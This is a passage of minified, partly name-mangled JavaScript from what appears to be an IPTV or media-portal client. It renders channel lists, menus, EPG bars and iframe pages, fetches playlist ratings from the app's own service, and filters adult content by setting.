style='float:right;display:none;padding-top:1px;font-size:"+(ch_size*(css_wh(100)/css_w(100))-css_wh(13))+"px;width:"+css_w(31)+"px;'></div>";if(gV(Ch,"search_on")!="")var titlSt=" listsearch";else titlSt="";html+='<div style="overflow:hidden;height: 100%;padding:0px 2px 0px 0px;" id="title'+index+'"><div id="titleid'+index+'" class="title'+titlSt+'">'+ttl+'</div></div>';html+="</div>";return gV(Ch,"before")+html+gV(Ch,"after")},ll00IOO11EVII1IYpr:function(pq){var c=this;ll010Apn00lIlYpr=35;ch_size=27;$_("main").style.fontSize="25px";lIO1001IDGQvI11lYpr=510;title_pad=2;$_("top2").style.zIndex="3";$_("top").style.backgroundColor=maJor.rgba("rgba(167, 167, 167,0.5)");$_("top2").style.backgroundColor=maJor.rgba("rgba(116, 116, 116,0.5)");if(maJor.params.get("pr")>0){$_("sidebar").style.whiteSpace="nowrap";$_("widget_date").style.whiteSpace="nowrap";$_("top2text").style.wordBreak="unset"}else{$_("sidebar").style.whiteSpace="normal";$_("widget_date").style.whiteSpace="normal";$_("top2text").style.wordBreak="normal"}
var u=getFon(maJor.params.get("fon"));if(maJor.fonEnabled()){if(maJor.series!="D"&&maJor.series!="C"&&maJor.series!="LW"&&maJor.platform()!="dune"&&maJor.params.get("pr")<100)
var bim="rgba(0,0,0,0."+(100-maJor.params.get("pr"))+")";else bim="";$_("pr").style.background=bim;if(!maJor.box_low){if(vPlayer.is_mini()&&!vPlayer.stopped){$_("main").style.background="none";$_("site").style.background="none";if(gV(c.global,"background")){$_("bcg1").style.display="block";$_("bcg1").style.background=c.global.background;$_("bcg2").style.display="block";$_("bcg2").style.background=c.global.background}else if(!gV(c.global,"background-image")){$_("bcg1").style.display="block";$_("bcg1").style.background="url("+_img(u)+")";$_("bcg2").style.display="block";$_("bcg2").style.background="url("+_img(u)+")"}}else{$_("main").style.backgroundImage="url("+_img(u)+")";$_("main").style.backgroundSize="cover";if(gV(c.global,"background")){$_("site").style.background=c.global.background}else if(gV(c.global,"background-image")){if(vPlayer.is_mini()){$_("bcg1").style.display="block";$_("bcg1").style.backgroundImage="url("+c.global["background-image"]+")";$_("bcg2").style.display="block";$_("bcg2").style.backgroundImage="url("+c.global["background-image"]+")"}else $_("site").style.background="url("+c.global["background-image"]+")"}else{$_("site").style.background="none"}}}}else{if(vPlayer.is_mini()&&!vPlayer.stopped){$_("main").style.background="none";$_("site").style.background="none";$_("bcg1").style.display="block";$_("bcg1").style.background="none black";$_("bcg2").style.display="block";$_("bcg2").style.background="none black"}else{$_("main").style.background="none black"}
$_("pr").style.background="none"}
$_("main").style.color=maJor.params.get("color");$_("main").style.font=maJor.params.get("font");document.getElementsByTagName('body')[0].style.fontFamily=maJor.params.get("font");if($_("sitebody"))$_("sitebody").style.color=maJor.params.get("color");c.setZoom();c.l11l0IfeO110IOYpr()},lOIl0Ou1On1llIlYpr:function(pq){var c=this;var default_css=[];if(maJor.box_low)var disp="float:left;";else disp="display: inline-block;";if(!maJor.box_low)default_css.push("::-webkit-scrollbar-button:single-button {background-color: #bbbbbb;display: block;border-style: solid;height: 10px;width: 10px;}	::-webkit-scrollbar-button:single-button:vertical:decrement {	  border-width: 5px;	  border-color: transparent transparent #555555;	}	::-webkit-scrollbar-button:single-button:vertical:increment {	  border-width: 5px;	  border-color: #555555 transparent transparent transparent;	} ::-webkit-scrollbar {  width: 10px;} ::-webkit-scrollbar-track {  background: #ddd; } ::-webkit-scrollbar-thumb {  background: #888; }::-webkit-scrollbar-thumb:hover {  background: #777; } ");default_css.push(".start{position: relative;border:0px;text-align:center;"+disp+";overflow:hidden;text-align:center; margin-left:4px;margin-top:1px;height:101px;width:10%;}");default_css.push(".start .rating{position:absolute;display:none;text-align:left;height:23px;width:28px;padding-top: 5px;padding-left: 5px;font-size:11px;}");default_css.push(".start .icon{padding:2px 2px 0px 2px;height:76%;}");default_css.push(".start .name{font-size:17px;line-height:0.9;position: absolute;bottom: 0px;width:100%;    max-height: 50%;}");default_css.push(".start .title{background: "+maJor.rgba("rgba(0,0,0,0.65)")+";border-radius:3px;width: auto;display: "+disp+"    margin: 2px;padding: 1px 4px 4px 4px;}");default_css.push(".start .side_icon{position:relative;padding:2px;}");if(c.hideRight)var widthCh=99;else if(c.is_iptv>2)widthCh=63;else widthCh=50.7;widthCh-=(3500/maJor.screen().w);default_css.push(".list{text-align:left;border-radius:4px 0px 0px 4px;cursor: default;margin: 2px 0px;width: "+widthCh+"%;height:"+ll010Apn00lIlYpr+"px;}");default_css.push(".list .contmenu{position: relative;  float: right;display:none;}");default_css.push(".list .numb{float:left;padding-top:2px;font-size: 60%;min-width:38px;text-align:center;}");default_css.push(".list .icon{margin: 0px 2px;padding-right: 2px;float:left;}");default_css.push(".list .title{"+((c.is_iptv>2)?"width:100%;":"")+""+disp+"float:left;position:relative;"+(maJor.box_low?"":"white-space:nowrap;")+"}");default_css.push(".listsearch{background-color:#ddd;color:#333;overflow: hidden;border-radius:4px;padding:3px;margin-top:2px;font-size:85%;width: 90%;height: 68%;}");default_css.push(".infolinktitle{height:63%;font-size:80%;overflow: hidden;}");default_css.push(".infolink{padding-left:3px;font-size:11px;}");default_css.push(".default .contmenu{display:none;}");default_css.push(".selected .contmenu{display:block;}");default_css.push(".html{position: relative;"+disp+"vertical-align: top;}");default_css.push(".hlink{position:relative;border:0px solid transparent;margin:0px 4px;border-radius: 4px;"+disp+"overflow:hidden;}");default_css.push(".hlink .title{overflow: hidden;max-width: 310px;font-size:90%;padding:0px 4px;float:left;height:28px; text-decoration: underline;}");default_css.push(".hlink .icon{float:left;height:22px;padding-top:5px;}");default_css.push(".fulleditline{border:1px solid transparent;width:80%;margin:1px 9%;border-radius: 4px;"+disp+"overflow:hidden;}");default_css.push(".fulleditline .title{overflow: hidden;font-size:24px;height:24px;margin:3px;color:#2b2525; background-color: #eee;padding:4px;}");default_css.push(".fulleditline .icon{float:right;height:22px;padding-top:2px;}");default_css.push(".label{position:relative;text-align: left;border-radius: 4px;margin:-2px 4%;font-size:80%;width:92%;"+disp+"overflow:hidden;height:26px;}");default_css.push(".label .icon{float:left;height:20px;}");default_css.push(".default{background:none;}");default_css.push(".selected{background:"+maJor.rgba("rgba(180, 180, 180, 0.7)")+";}");default_css.push(".listselected{color:black;}");default_css.push(".site{height: 100%;width: 100%;overflow-y: auto;overflow-x: hidden;font-size:"+ch_size+"px;}");default_css.push("body{color: "+$_("main").style.color+";margin:0px;padding:0px;height: 100%;width: 100%;overflow: hidden;background-color: transparent;}");default_css.push("small{font-size:70%;color:gray;}");default_css.push(".buttons{position:fixed;top:80%;left:50%;width:47%;margin:2px;display:none;padding:0px 3px 0px 3px;color:#cccccc;font-size:80%;}");if(c.is_iptv>2){var rStyle="left:63%;width:35%;color:rgb(208, 198, 201);"}else{rStyle="left:51%;width:47.2%;"}
rStyle+="top:0px;";if(!maJor.box_low)rStyle+="word-break:break-word;";if(c.typeList=="start"&&(!c.is_html||(!c.hascoords&&!c.br)))rStyle="bottom:75px;right:0px;width:50%;height:30px;overflow:hidden;position:absolute;text-align:right;";default_css.push(".description{position:fixed;margin:2px;overflow-x:hidden; overflow-y:auto;display:none;padding:0px 3px 0px 3px;font-size:"+(1+ch_size)+"px;"+(rStyle)+"}");return default_css.join(' ')},setZoom:function(m){$_("main").style.zoom=maJor.params.get("zoom")+"%";$_("popUp").style.zoom=maJor.params.get("zoom")+"%";$_("statbar2").style.zoom=maJor.params.get("zoom")+"%";if(m&&$_("sitebody")!=null){kjtYpr.popUp("Reload page for changes zoom page",1500)}},renderPage:function(pq){var c=this;c.setZoom();c.start11=new Date().getTime();if(gV(c.global,"title")!="")c.title=c.global.title;else if(pq.elCh.title!="")c.title=pq.elCh.title;else c.title=c.lII1I1PVBuI1lIlYpr;breakScreen(getInfoUrl(c.lII1I1PVBuI1lIlYpr));if(gV(c.global,"icon")!="")c.icon=c.global.icon;else c.icon=pq.elCh.logo_30x30;$_("insetttl"+pq.l11I101vQBOw0llIYpr.id,c.title);pq.l11I101vQBOw0llIYpr.title=c.title;pq.l11I101vQBOw0llIYpr.icon=c.icon;var rStyle="";if(insetActive==pq.l11I101vQBOw0llIYpr.id){c.ll00IOO11EVII1IYpr(pq);if(c.channels.length<1){c.global.before=gV(c.global,"before")+"<div style='position:absolute;left:15px; top:48px;overflow:hidden;font-size:100%;'><small>_FPZdesPusto_</small></div>"}
c.hideRight=0;var siteTop=75;if(maJor.params.get("sidebar")>0)siteTop=105;if(maJor.params.get("zoom")!=100)siteTop=$_('panel').offsetHeight;siteHeight=maJor.screen().h-siteTop;$_("site").style.left="0px";$_("site").style.top=siteTop+"px";$_("site").style.width="100%";$_("site").style.height="100%";if(gV(c.global,"options").indexOf("hidedescription")>=0){c.hideRight=1}else c.hideRight=0;var hmenu="";if(maJor.box_low||maJor.params.get("pr")==0)wordBreak="";else wordBreak="word-break:break-all;";if(c.menu.length){try{var wi=Math.ceil((1270-c.menu.length*9)/c.menu.length);var dop="background-color:#596367;";hmenu+="<div id='menu' style='"+wordBreak+"margin: 3px 0px 4px -2px;width:100%;float: left;overflow-x:hidden;overflow-y:visible;height:"+Math.ceil(ll010Apn00lIlYpr*0.80+3)+"px;"+dop+"'>";for(var i=0;i<c.menu.length;i++){var li="";if(c.menu[i].playlist_url=="submenu"&&typeof c.menu[i].submenu!="undefined"&&c.menu[i].submenu.length){li="<ul id='menu"+i+"sub' style='position:absolute;display:none;list-style:none;padding:5px;margin:2px 0px;z-index:2;background: inherit;'>";for(var j=0;j<c.menu[i].submenu.length;j++){var el=c.menu[i].submenu[j];li+="<li id='menu"+i+"sub"+j+"'"+llOlI0OfCMO0l0I0Ypr(1,[" onmousemove=\"if(parent.handler=='menu'&&parent.menuSubSel!="+j+") {parent.setSelect(-3);parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_sel();}\" onclick=\"parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_play();\"",""])+" style='border:2px solid transparent;margin:2px 0px;width:100%;overflow:hidden;background: inherit;'><img onerror=\"this.onerror=null;this.style.display='none';\" width='"+Math.ceil(ll010Apn00lIlYpr*0.85)+"' height='"+Math.ceil(ll010Apn00lIlYpr*0.7)+"' style='float: left; padding: 2px 4px 0px 0px;' src='"+_img(el.logo_30x30)+"' /> "+el.title+"</li>"}
li+="</ul>"}
var ci=gV(c.menu[i],"logo_30x30");if(ci=="hidden"||ci=="none"||ci==""||maJor.box_low||llOlI0OfCMO0l0I0Ypr(12))var logo="";else logo="<img onerror=\"this.onerror=null;this.style.display='none';\" width='"+Math.ceil(ll010Apn00lIlYpr*0.85)+"' height='"+Math.ceil(ll010Apn00lIlYpr*0.7)+"' style='float: left; padding: 2px 4px 0px 0px;' src='"+_img(c.menu[i].logo_30x30)+"' /> ";hmenu+=gV(c.menu[i],"before")+"<div id='menu"+i+"'"+llOlI0OfCMO0l0I0Ypr(1,[" onmousemove=\"if(parent.handler=='menu'&&(parent.getSelect()!=-3||parent.menuSel!="+i+")) {parent.menuSubSel=-2;parent.setSelect(-3);parent.menuSel="+i+";parent.linkOver();}\" onclick=\"if(parent.menuSubSel!=-2) parent.menu_hideSub();else{parent.menuSel="+i+";parent.menu_play();}\"",""])+" style='height:"+Math.ceil(ll010Apn00lIlYpr*0.80-1)+"px;border:2px solid transparent;margin:0px 5px;float:left;font-size:85%;background: inherit;'><div style='overflow:hidden;max-width:"+wi+"px;height:"+Math.ceil(ll010Apn00lIlYpr*0.80-1)+"px;'>"+logo+c.menu[i].title+"</div>"+li+"</div>";hmenu+=gV(c.menu[i],"after")}
hmenu+="</div>"}catch(e){kjtYpr.popUp("Error menu on this site<br>"+e.message,2000)}}
statusbar("Load elements: "+c.channels.length);var iframe=$_("site");iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);iframe.document.open();iframe.document.write("<!DOCTYPE html><html>"+"<style>"+c.lOIl0Ou1On1llIlYpr()+' '+gV(c.global,"css").replace(/(\\|')/g,"").replace(/"/g,'\"')+"</style>"+"<body id=\"sitebody\" style=\"border:none;margin:0px; padding:0px;zoom:"+maJor.params.get("zoom")+"%;\" ontouchmove=\"parent.t_e();\" ontouchend=\"parent.t_e();\">"+"<div id=\"scrollsite\" class=\"site\" style=\"height:"+((maJor.screen().h*100/maJor.params.get("zoom"))-siteTop).toFixed(0)+"px;\" onscroll=\"parent.scrollSite();\"></div>"+"<div id=\"bbot\" class=\"buttons\"></div>"+"</body>"+"<script>"+"document.addEventListener(\"keydown\",parent.keyHandler,false);"+"var $=parent.$;"+"</script>"+"</html>");iframe.document.close();c.setload=1;onloadtimer=setInterval(function(){if($_("scrollsite")&&c.setload&&insetActive==pq.l11I101vQBOw0llIYpr.id){c.setload=0;buff.cleartop();clearInterval(onloadtimer);$_("scrollsite",hmenu+'<div id="zpanel" style="display:none;width:100%;height:100%;overflow-y:scroll;z-index:2; padding: 10px;"></div><div id="description" class="description"></div> <div id="controlcontent" style="padding-bottom: 43px;float: left;width:100%;margin:0px;text-align:'+((gV(c.global,"align")=="")?"center":gV(c.global,"align"))+';"><div id="content"></div></div>');if(c.l11I101vQBOw0llIYpr.loadPage!=null){c.l11I101vQBOw0llIYpr.INC=c.l11I101vQBOw0llIYpr.loadPage.inc;c.l11I101vQBOw0llIYpr.page=c.l11I101vQBOw0llIYpr.loadPage;c.l11I101vQBOw0llIYpr.isLoading=0;delete c.l11I101vQBOw0llIYpr.loadPage}else c.l11I101vQBOw0llIYpr.INC=c.inc;c.l11I101vQBOw0llIYpr.lastResel="";c.renderChannels(getSelect());if(!pq.goBack)lIIOOOa1ag001OIYpr(c);if(gV(c.global,"returnSelect")!==""){c.l11I101vQBOw0llIYpr.focused(gV(c.global,"returnSelect"));c.global.returnSelect=""}else if(gV(c.global,"defaultSelect")!=="")c.l11I101vQBOw0llIYpr.focused(gV(c.global,"defaultSelect"));else if(gV(pq.elCh,"defaultSelect")!=="")c.l11I101vQBOw0llIYpr.focused(gV(pq.elCh,"defaultSelect"));else c.l11I101vQBOw0llIYpr.focused(0);if(gV(c.global,"returnTop")>0){buff.scrollsitetop(c.global.returnTop);c.global.returnTop=""}
set_times();if(maJor.params.get("rate")>0)c.get_rates();if(c.IFRAMES.length==0)c.cancel()}},80)}else{}
oInset.renderInset();$_("imgkb3").src=_img(c.l11I101vQBOw0llIYpr.fwhistory.length?"_ST_page_fwd.png":"_ST_page_fwd_off.png");$_("imgkb2").src=_img(c.l11I101vQBOw0llIYpr.history.length>1?"_ST_page_back.png":"_ST_page_back_off.png?ndate221006_")},validate:function(s){if(s.indexOf("<style>")>=0){s=s.replace(/<style.*?>.*?<\/style>/g,'Deprecated $_PL["style"] Use new global tag $_PL["css"] Detail at http://bit.ly/3LLZXnD')}
return s},epgAppend:function(b1,b2){var c=this;var top_t=buff.scrollsitetop()-maJor.screen().h;var top_b=top_t+(maJor.screen().h*3);if(!l0O0l0111mJXG1OII1OYpr()&&c.is_iptv>2){var x1=getSelect()-20;var x2=getSelect()+20;if(b1!=null)x1=b1;if(b2!=null)x2=b2;if(x1<0)x1=0;if(x2>c.channels.length)x2=c.channels.length;for(var i=x1;i<x2;i++){if(c.getTypePos(c.channels[i],i)=="list"&&$_("ch"+i)){if(c.channels[i].epgnow){var ch_pos=buff.chtop(i);if(ch_pos>top_t&&ch_pos<top_b){var title=c.channels[i].display_title||c.channels[i].title;if(title==""||title==" ")title=gV(c.channels[i],"playlist_url").replace(/^https?:\/\//,"");$_("titleid"+i,"<div style='width: 40%;  float: left;  text-align: left;  height: 35px;    overflow: hidden;  '>"+""+title+"</div>"+"<div style='float:right;width:59%;text-align:left;font-size:21px;'><div style='float:left;width:86%;height:23px; overflow: hidden;'>"+c.channels[i].epgnow.title+"</div><div style='float:right;width: 14%;font-size: 90%;'>"+c.channels[i].epgnow.time+"</div><br>"+"<div style='width:100%;height:5px;background-color:gray;'>"+"<div style='width:"+c.channels[i].epgnow.cur+"%;height:5px;background-color:rgb(132, 29, 29);'></div>"+"</div>"+"</div>")}else if(ch_pos>top_b)break}}}}},get_rates:function(){var c=this;if(rates[c.lII1I1PVBuI1lIlYpr])c.set_rates(rates[c.lII1I1PVBuI1lIlYpr]);else{var s="";for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0){var k=md5(c.channels[i].playlist_url);if(s.indexOf(k)==-1){if(s!="")s+="-";s+=k}}}
if(s)uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?do=get&u="+s).parse=function(s){var m=l0OIIlIIlONuu1111Ypr(s);if(m){rates[c.lII1I1PVBuI1lIlYpr]=m;c.set_rates(m)}}}},set_rates:function(m){var c=this;var x1=0,x2=9999;if(maJor.params.get("pr")>0)var backgrOp="background:none #123313;";else backgrOp="";for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0){var x=md5(c.channels[i].playlist_url);if(m[x]){c.channels[i].rates=m[x];if(m[x][0]||m[x][1]){var proc=Math.ceil(100*(m[x][1]/(m[x][0]+m[x][1])));c.channels[i].rates[2]=proc;if($_("rat"+i)){$_("rat"+i).style.display="block";$_("rat"+i,"<span style='color:#54d659;padding:1px 2px;font-size:12px;"+backgrOp+"'>"+proc+"%</span><br><span style='color:#c7c1c1;padding:1px 2px;font-size:10px;"+backgrOp+"'>"+(m[x][0]+m[x][1])+"</span>")}}}}}},renderIcons:function(n){var c=this;var top_t=(buff.scrollsitetop()*0.75).toFixed(0);var top_b=(buff.scrollsitetop()+($("#site").height()*2)*1.25).toFixed(0);var x1=n-50;var x2=n+50;if(x1<0)x1=0;if(x2>c.channels.length-1)x2=c.channels.length-1;for(var i=x1;i<=x2;i++){if($_("ch"+i)!=null){if($_("ch"+i).style.display=="none")$_("ch"+i).style.display="";if($_("img"+i)!=null){var ch_pos=buff.chtop(i);if(ch_pos>=top_t&&ch_pos<top_b){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}else if(ch_pos>top_b){break}}}}},renderChannels:function(n,mode){var c=this,n2=0,x1;if(insetActive!=c.l11I101vQBOw0llIYpr.id)return;var top_t=(buff.scrollsitetop()*0.75).toFixed(0);var top_b=(buff.scrollsitetop()+($("#site").height()*2)*1.25).toFixed(0);if(n==null){for(var i=0;i<c.channels.length;i++){if(buff.chtop(i)>=buff.scrollsitetop()){x1=i;break}}
if(x1==null){x1=0;var x2=c.channels.length}else{x1-=50;x2=x1+100}}else{x1=1*n-50;x2=1*n+50}
if(gV(mode)=="update"){if(prev[c.SAVE_lII1I1PVBuI1lIlYpr])prev[c.SAVE_lII1I1PVBuI1lIlYpr].channels=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.channels))}
if(c.count!=c.channels.length||gV(mode)=="update"||!$_("content")||!$_("content").innerHTML){var html="";c.upPos();for(var i=0;i<c.channels.length;i++){var Ch=c.channels[i];Ch.imgsrc=Ch.logo_30x30;var dop="";if(i<x1||i>x2){dop=' style="display:none;"'}
html+=c.renderCh(Ch,i,dop)}
if(c.deprecated.length&&c.lII1I1PVBuI1lIlYpr.indexOf("http")==0)var depr='<div style="font-size:80%;color:gray;">This site '+c.deprecated.join(" and ")+'  Detail at http://bit.ly/3LLZXnD</div>';else depr="";$_("content",depr+c.validate(gV(c.global,"before")+html+gV(c.global,"after")));c.count=c.channels.length;if(n!=null){c.l11I101vQBOw0llIYpr.lastselect=n;c.l11I101vQBOw0llIYpr.mark(n,1)}}
for(var i=0;i<c.channels.length;i++){if(typeof c.channels[i]=="undefined"){}else if($_("ch"+i)!=null){if(i>=x1&&i<=x2){$_("ch"+i).style.display="";if($_("img"+i)!=null){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}
if(c.channels.length>3&&getSelect()>=0.7*i&&c.canceled&&typeof c.channels[i].onshow=="object"&&c.IFRAMES.length==0){c.iframeajax=1;c.canceled=0;c.channels[i].iframeid=i;c.channels[i].iframe="0";c.channels[i].iframetype="ajax";var t=c.channels[i].onshow;t.iframeid=i;t.iframe="0";t.iframetype="ajax";c.IFRAMES.push(t);delete c.channels[i].onshow;if($_("titleid"+i)!=null&&gV(t,"title")!="")$_("titleid"+i,gV(t,"title"));if($_("img"+i)!=null&&gV(t,"logo_30x30")!="")$_("img"+i).src=gV(t,"logo_30x30")}}}}
c.epgAppend(x1,x2);var nvinfo=c.typeSource;if(c.iframeajax||(!c.canceled&&mode!="focused")){var olu="";if(!c.iframeajax)c.l11I101vQBOw0llIYpr.focused();c.iframeajax=0;if(c.IFRAMES.length){for(var i in c.IFRAMES){if(typeof c.IFRAMES[i].src=="undefined"){if(olu.indexOf("--"+c.IFRAMES[i].playlist_url+"--")>=0)continue;c.IFRAMES[i].src=1;for(var j in c.channels){if(c.channels[j].iframeid==c.IFRAMES[i].iframeid){if($_("img"+j))$_("img"+j).src=_img("_ST_b_loading.gif?ifr");break}}
var tmp={}
nvinfo+=" "+((++c.IFRAMES_INSERT)+"/"+c.IFRAMES.length);if(maJor.timestamp>0)c.l11I101vQBOw0llIYpr.navigate(c.IFRAMES[i]);else setTimeout(function(){if(!c.canceled)c.l11I101vQBOw0llIYpr.navigate(c.IFRAMES[i])},1600);return}
olu+="--"+c.IFRAMES[i].playlist_url+"--"}
c.IFRAMES=[];for(var i in c.channels){c.channels[i].iframe="";c.channels[i].iframeid=""}
c.cancel()}}
$_("navinfo2",nvinfo);if(nvinfo)$_("navinfo2").style.display="inline";else $_("navinfo2").style.display="none"},getSubI:function(x,ch){var c=this;if(x.length==1)return ch[x[0]].submenu;else{ch=ch[x.shift()].submenu;return c.getSubI(x,ch)}},toChannels:function(pq){var c=this;c.reallinks=0;if(c.canceled){return}
c.l11I101vQBOw0llIYpr=pq.l11I101vQBOw0llIYpr;if(!c.llIl1100glLO10l1Ypr){if(c.handlerData(pq)){return}}
if(c.canceled){return}
if(pq.data.channels==null){}
try{if(pq.data.channels[0].title.match(/(Нет данных|Здесь пусто)/)){c.ERR=0}}catch(e){if(c.llIl1100glLO10l1Ypr){if(gV(pq.elCh,"iframetype")!="ajax")pq.data.channels=[{"title":"Ничего не найдено!"}]}}
var dm=c.lII1I1PVBuI1lIlYpr.match("^https?://(www\.|m\.)?(.*?)(:|\\?|/|#|$)");if(dm!=null)dm=dm[2];else dm="localhost";c.XML_DOMAIN=dm;prev[c.SAVE_lII1I1PVBuI1lIlYpr.split("#submenu")[0].split("#group=")[0]]=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(pq.data));if(c.lII1I1PVBuI1lIlYpr.indexOf("#submenu")>0){var x=c.lII1I1PVBuI1lIlYpr.split("#submenu");x.shift();var ch=c.getSubI(x,pq.data.channels);pq.data.channels=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(ch));pq.data.title="";pq.data.navigate=""}
var m=c.lII1I1PVBuI1lIlYpr.match(/#.*?catchup=(.*?)(&|$|#)/);if(m!=null)c.global.catchup=m[1];var m=c.lII1I1PVBuI1lIlYpr.match(/#.*?catchup-days=(.*?)(&|$|#)/);if(m!=null)c.global.catchup_days=m[1];c.deprecated=[];var alltags=[];if(gV(pq.data,"is_iptv").toString().match(/true|1/i))c.is_iptv=10;else if(gV(pq.data,"is_iptv").toString().match(/false|0/i))c.is_iptv=-1;for(var i in pq.data){if(i.indexOf("all_")==0)alltags[i.substr(4)]=pq.data[i]}
if(pq.data.style&&gV(pq.data,"css")==""){for(var i in pq.data.style){}
c.deprecated.push('use deprecated $_PL["style"] Please use new global tag $_PL["css"]')}
if(gV(pq.data,"css").match(/important/)){c.deprecated.push('use illegal !important tags in $_PL["css"] Please delete It`s');pq.data.css=pq.data.css.replace(/!.*?important/g,"important")}
for(var i in pq.data){var v=pq.data[i];if(i=="menu"){for(var j in v){if(gV(v[j],"playlist_url").indexOf("AddSearch(")==0&&l11IOOMMvt011llOYpr(gV(v[j],"playlist_url"))){}else if(gV(v[j],"playlist_url").indexOf("AddFavorite(")==0&&lOlO1IRNIA1lOlYpr(gV(v[j],"playlist_url"))){}else c.menu.push(v[j])}}else if(i=="channels"){maJor.each(v,function(w){var ttl=gV(w,"title");for(var k in alltags){if(gV(w,k)=="")w[k]=alltags[k];else{w[k]=w[k].replace("all_"+k,alltags[k])}}
if(typeof w.br!="undefined"){c.br=1}
if(w.coordination){c.hascoords=1}
if(gV(w,"position")!="")c.is_html=1;if(gV(w,"iframe")!==""){w.iframelogo=gV(w,"logo_30x30");if(c.llIl1100glLO10l1Ypr){w.iframeid=pq.elCh.iframeid+"-"+c.channels.length;c.l11I101vQBOw0llIYpr.page.IFRAMES.push(w)}else{w.iframeid=c.channels.length;c.IFRAMES.push(w)}}
w.stream_url=gV(w,"stream_url");if(gV(w,"search_on")==""&&((gV(w,"playlist_url")+gV(w,"stream_url")).match(/^(http|udp)/)||gV(w,"parser").match(/^(http)/)))c.reallinks++;if(gV(w,"playlist_url").indexOf("payd_")==0){c.input[w.playlist_url.substr(5)]=gV(w,"value")}
if(w.stream_url){if(w.stream_url.match(/\.(m3u|xml|txt)$/i)){w.playlist_url=w.stream_url;w.stream_url=""}else if(!l0O0l0111mJXG1OII1OYpr(c.lII1I1PVBuI1lIlYpr)&&c.is_iptv>=0&&c.is_iptv<4){if(w.jtvname)c.is_iptv++;if(ttl.length<27){if(typeof JtvC[ttl.toLowerCase()]!="undefined"||typeof JtvE[ttl.toLowerCase()]!="undefined"){c.is_iptv++}else if(ttl.match(/^(discovery|россия|СТС|тнт| канал|канал |brazzers tv|hustler |Amedia|Пиксель|Nickelodeon|ПлюсПлюс|Карусель|Малятко|Boomerang|Охота и рыбалка|Матч|CBS|Bridge|MTV |Music Box|CNN|LifeNews|Russia Today|TV |TV-)/i)){c.is_iptv++}else if(ttl.match(/ tv( |$)/i)){c.is_iptv++}}}}
if(gV(w,"group")!==""){var k=w.group.split(";");for(var jk=0;jk<k.length;jk++){if(!in_array(k[jk],c.group))c.group.push(k[jk])}}
if(gV(w,"location")>0){if(typeof pq.l11I101vQBOw0llIYpr.page!="undefined"){if(typeof prev[pq.l11I101vQBOw0llIYpr.page.SAVE_lII1I1PVBuI1lIlYpr]!="undefined")prev[pq.l11I101vQBOw0llIYpr.page.SAVE_lII1I1PVBuI1lIlYpr].cacheinfo="nocache"}
if(w.location==2){}
c.haslocation=1;return pq.l11I101vQBOw0llIYpr.navigate(w)}
if(maJor.params.get("adult")==0&&c.lII1I1PVBuI1lIlYpr.match(/^(http|about:blank|submenu)/)&&(gV(w,"group").match(/взрослы/i)||is_xxx(gV(w,"group"))||is_xxx(gV(w,"infolink"))||is_xxx(gV(w,"title"))||is_xxx(gV(w,"playlist_url"))||is_xxx(gV(w,"stream_url")))){if(c.lII1I1PVBuI1lIlYpr.match(/^about:blank/))return;w.title="This content hidden in your settings!";w.description="This content hidden in your settings!";w.logo_30x30="https://raw.githubusercontent.com/komivp/appinfodl/main/static/sensitive.png";w.stream_url="";w.infolink="";w.playlist_url="cmd:info(Adult content hidden in your settings!);"}
if(gV(w,"playlist_url").indexOf("AddSearch(")==0&&l11IOOMMvt011llOYpr(gV(w,"playlist_url"))){}else if(gV(w,"playlist_url").indexOf("AddFavorite(")==0&&lOlO1IRNIA1lOlYpr(gV(w,"playlist_url"))){}else c.channels.push(w)})}else if(i=="typeList"&&v!="")c.typeList=v;else{c.global[i]=v;if(i.replace&&v!==""){c.global[i.replace("-","_")]=v;c.global[i.replace("_","-")]=v}}}
if(c.haslocation)return;if(c.hascoords)c.deprecated.push('use deprecated $_CH["coordination"] Please use new channel tag $_CH["br"]=1 for new line');if(gV(c.global,"next_page_url")!=""){var x={"logo_30x30":_img("_ST_right.png"),"title":"Next page","playlist_url":gV(c.global,"next_page_url"),"onshow":{"logo_30x30":_img("_ST_b_loading.gif"),"title":"Load next page...","playlist_url":gV(c.global,"next_page_url"),"iframeid":c.channels.length,"iframe":0,"iframetype":"ajax"}};if(c.llIl1100glLO10l1Ypr&&gV(pq.elCh,"iframetype")!="ajax")x.onshow=null;c.channels.push(x);c.global.next_page_url=""}
if(pq.tosource){c.l11I101vQBOw0llIYpr.navigate("view-source:"+c.lII1I1PVBuI1lIlYpr);pq.tosource=0;return}
if(c.llIl1100glLO10l1Ypr&&c.channels.length>0){var xp=pq.elCh.iframe.split(",");if(xp.length>1)c.IFRAMES_INSERT=parseInt(xp[1]);for(var i in c.l11I101vQBOw0llIYpr.page.channels){if(c.l11I101vQBOw0llIYpr.page.channels[i].iframeid==pq.elCh.iframeid){if(isNaN(c.IFRAMES_INSERT)||c.IFRAMES_INSERT<1)c.IFRAMES_INSERT=i;var x=c.l11I101vQBOw0llIYpr.page.channels.splice(i,1);var jpush=0;for(var j=0;j<c.channels.length;j++){if(gV(c.global,"startcontent")>0){if(j<c.global.startcontent)continue}
if(gV(c.global,"endcontent")!=""&&gV(c.global,"endcontent")>=0){if(j>c.global.endcontent)continue}
if(gV(pq.elCh,"iframetype")=="ajax"){}else{if(c.channels[j].stream_url==""&&c.channels[j].playlist_url=="")continue;if(gV(pq.elCh,"excludetitlematch")!=""){if(c.channels[j].title.match(new RegExp(gV(pq.elCh,"excludetitlematch"),"ig")))continue}else if(c.channels[j].title.match(/(не найдено|здесь пусто|следующая стр|нет результатов)/i))continue;if(pq.elCh.logo_30x30.match(/^(http|_)/))c.channels[j].logo_30x30=pq.elCh.iframelogo;c.channels[j].position=gV(pq.elCh,"position");if(!pq.elCh.position&&c.l11I101vQBOw0llIYpr.page.global.typeList!="start"){c.channels[j].before=c.channels[j].after=""}
